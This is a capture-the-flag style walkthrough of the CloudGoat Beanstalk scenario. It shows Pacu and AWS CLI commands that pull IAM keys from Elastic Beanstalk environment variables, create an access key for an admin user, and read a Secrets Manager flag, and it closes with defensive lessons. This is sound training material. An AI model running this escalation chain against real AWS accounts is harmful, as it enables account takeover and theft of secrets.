# CloudGoat: Beanstalk Secrets Privilege Escalation Walkthrough

## TL;DR

### Attack Chain Summary:
- Low-priv user enumerates Elastic Beanstalk and discovers IAM credentials in environment variables.
- Secondary user account accessed using those credentials, has `iam:CreateAccessKey` on all users.
- Creates access key for admin user, gaining full permissions.
- Retrieves final flag from AWS Secrets Manager.

---

## Initial Access

We begin by deploying the CloudGoat scenario and collecting the initial credentials.

```
[cloudgoat] terraform output completed with no error code.
initial_low_priv_credentials = Access Key: AKIA2S3E7PEZB6LWDSKC
Secret Key: [REDACTED]
```

Configure AWS CLI with the low-privileged credentials:

```bash
aws configure --profile beanstalk
```

Verify access:

```bash
tcm@SOC101-ubuntu:~$ aws sts get-caller-identity --profile beanstalk
{
  "UserId": "AIDA2S3E7PEZDTQZ3HGBE",
  "Account": "727671863602",
  "Arn": "arn:aws:iam::727671863602:user/cgidjyfk5bfoad_low_priv_user"
}
```

---

## Pacu - IAM Enumeration

**Enumerated Allowed Services:**  
Initial attempts to enumerate services with this user were unsuccessful due to insufficient permissions for basic Pacu enumeration modules.

Brute force enumeration attempts resulted in long runtimes and frequent errors.  
This issue didn’t occur in other runs of the scenario, so it’s likely environment-specific.

Knowing that this vulnerability involved Elastic Beanstalk, I searched for relevant Pacu modules and executed `elasticbeanstalk__enum`, which successfully retrieved useful information.

```bash
ec2.describe_subnets()
sts.get_caller_identity()
dynamodb.describe_endpoints()
sts.get_session_token()
```

**User identity in Pacu:**

```json
Pacu (beanstalk:imported-beanstalk) > whoami
{
  "UserName": "cgidjyfk5bfoad_low_priv_user",
  "Arn": "arn:aws:iam::727671863602:user/cgidjyfk5bfoad_low_priv_user",
  "AccountId": "727671863602"
}
```

---

## Elastic Beanstalk Enumeration

Using Pacu to enumerate Elastic Beanstalk:

```bash
Pacu (beanstalk:imported-beanstalk) > run elasticbeanstalk__enum --region us-east-1
```

> **Note:** This module automatically checks for IAM permissions and exits early if the current profile doesn't have `elasticbeanstalk:DescribeConfigurationSettings`.

### Findings (when run with appropriate permissions):

- Elastic Beanstalk application and environment found in `us-east-1`
- Sensitive environment variables discovered containing IAM credentials:

```env
SECONDARY_ACCESS_KEY=[REDACTED]
SECONDARY_SECRET_KEY=[REDACTED]
```

Output saved to:
```
/home/tcm/.local/share/pacu/beanstalk/downloads/beanstalk_secrets_beanstalk_us-east-1.txt
```

---

## Using Discovered Credentials

Configured new AWS profile with discovered keys:

```bash
aws configure --profile beanstalk2
```

Verified new identity:

```bash
aws sts get-caller-identity --profile beanstalk2
{
  "UserId": "AIDA2S3E7PEZDTFZLZT3W",
  "Arn": "arn:aws:iam::727671863602:user/cgidjyfk5bfoad_secondary_user"
}
```

---

## IAM Enumeration (Second User)

Enumerated IAM users, policies, groups, and roles:

```bash
Pacu > run iam__enum_users_roles_policies_groups
```

### Discovered IAM Users:
- cgidjyfk5bfoad_admin_user  
- cgidjyfk5bfoad_low_priv_user  
- cgidjyfk5bfoad_secondary_user  
- cloudgoat

### Discovered IAM Policies:
- cgidjyfk5bfoad_secondary_policy  
- cgidjyfk5bfoad_admin_user_policy  
- cgidjyfk5bfoad_low_priv_policy  

### View Policy Permissions

Permissions in `cgidjyfk5bfoad_secondary_policy`:

```json
{
  "Action": [
    "iam:CreateAccessKey",
    "iam:ListRoles",
    "iam:GetRole",
    "iam:ListPolicies",
    "iam:GetPolicy",
    "iam:ListPolicyVersions",
    "iam:GetPolicyVersion",
    "iam:ListUsers",
    "iam:GetUser",
    "iam:ListGroups",
    "iam:GetGroup",
    "iam:ListAttachedUserPolicies",
    "iam:ListAttachedRolePolicies",
    "iam:GetRolePolicy"
  ],
  "Effect": "Allow",
  "Resource": "*"
}
```

> 🔥 **Critical Finding:**  
> The `cgidjyfk5bfoad_secondary_user` has `iam:CreateAccessKey` on all users, enabling privilege escalation.

Permissions in `cgidjyfk5bfoad_admin_user_policy`:

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": "*",
      "Resource": "*"
    }
  ]
}
```

---

## Policy Attachment Discovery

**Secondary User:**

```bash
aws iam list-attached-user-policies --user-name cgidjyfk5bfoad_secondary_user --profile beanstalk2
```

```json
{
  "AttachedPolicies": [
    {
      "PolicyName": "cgidjyfk5bfoad_secondary_policy",
      "PolicyArn": "arn:aws:iam::727671863602:policy/cgidjyfk5bfoad_secondary_policy"
    }
  ]
}
```

**Admin User:**

```bash
aws iam list-attached-user-policies --user-name cgidjyfk5bfoad_admin_user --profile beanstalk2
```

```json
{
  "AttachedPolicies": [
    {
      "PolicyName": "cgidjyfk5bfoad_admin_user_policy",
      "PolicyArn": "arn:aws:iam::727671863602:policy/cgidjyfk5bfoad_admin_user_policy"
    }
  ]
}
```

---

## Gameplan

Based on the IAM enumeration results and policy analysis, it was identified that the `cgidjyfk5bfoad_secondary_user` possesses the `iam:CreateAccessKey` permission on all users.

This means the secondary user can generate new access keys for any IAM user, including those with administrative privileges.

> **Privilege escalation path identified:**  
> Create a new access key for the `cgidjyfk5bfoad_admin_user` to gain full administrative access to the AWS environment.

---

## Privilege Escalation - Creating Access Key for Admin Use

Created a new access key for the admin user:

```bash
aws iam create-access-key --user-name cgidjyfk5bfoad_admin_user --profile beanstalk2
```

Configured new profile `beanstalk3` with admin credentials:

```bash
aws configure --profile beanstalk3
```

Validated elevated privileges:

```bash
aws sts get-caller-identity --profile beanstalk3
```

---

## Retrieving Final Flag - Secrets Manager

Listed secrets in AWS Secrets Manager:

```bash
aws secretsmanager list-secrets --profile beanstalk3
```

Discovered secret:

```
Name: cgidjyfk5bfoad_final_flag
ARN: arn:aws:secretsmanager:us-east-1:727671863602:secret:cgidjyfk5bfoad_final_flag-nypnix
```

Retrieved the secret value:

```bash
aws secretsmanager get-secret-value --secret-id arn:aws:secretsmanager:us-east-1:727671863602:secret:cgidjyfk5bfoad_final_flag-nypnix --profile beanstalk3
```

**Final Flag:**

```bash
FLAG{D0nt_st0r3_s3cr3ts_in_b3@nsta1k!}
```

✅ **Privilege escalation complete. Final flag successfully retrieved from AWS Secrets Manager.**


Theory: How This Privilege Escalation Works
This CloudGoat scenario demonstrates a realistic attack chain in which an attacker pivots from a low-privileged IAM user to full administrative control over an AWS account using exposed secrets within an Elastic Beanstalk environment.

Key Concepts:
1. Elastic Beanstalk Environment Variables
Elastic Beanstalk allows environment variables to be configured for applications. However, if sensitive data like IAM credentials are placed in these variables, they can be accessed by anyone with permission to view the environment's configuration—posing a severe security risk.

In this scenario, our low-privileged user had the ability to enumerate Beanstalk applications and extract environment variables. This led to the discovery of a second set of AWS keys.

2. Lateral Movement with Discovered Credentials
The leaked keys belonged to a second IAM user (cgidjyfk5bfoad_secondary_user) who had elevated IAM read and create permissions. This allowed us to:

Enumerate all users, groups, and roles.

Read and understand attached IAM policies.

Create new access keys for other users.

This is an example of lateral movement in the AWS environment—pivoting from one compromised identity to a more privileged one.

3. IAM Misconfiguration and Escalation Path
The secondary user’s policy allowed the following escalation technique:

Use iam:CreateAccessKey on any user.

Identify that cgidjyfk5bfoad_admin_user existed and had a policy granting full access (Action: "*").

Create a new access key for that admin user, effectively giving us full admin rights.

This is a textbook example of privilege escalation via IAM misconfiguration. Even without being in the Administrator group, the ability to create access keys for an admin user is equivalent to full account compromise.

4. Post-Escalation Actions: Secrets Manager
With full admin access, we were able to access AWS Secrets Manager to retrieve the final flag. This demonstrates how over-permissioned roles and weak secrets management can lead to complete data exposure.

Lessons Learned:
Never store IAM credentials in application-level environment variables.

Apply the principle of least privilege: users should only be able to perform actions necessary for their role.

Regularly audit IAM policies and attached users for excessive permissions.

Use Secrets Manager or Parameter Store with encryption for managing secrets securely.

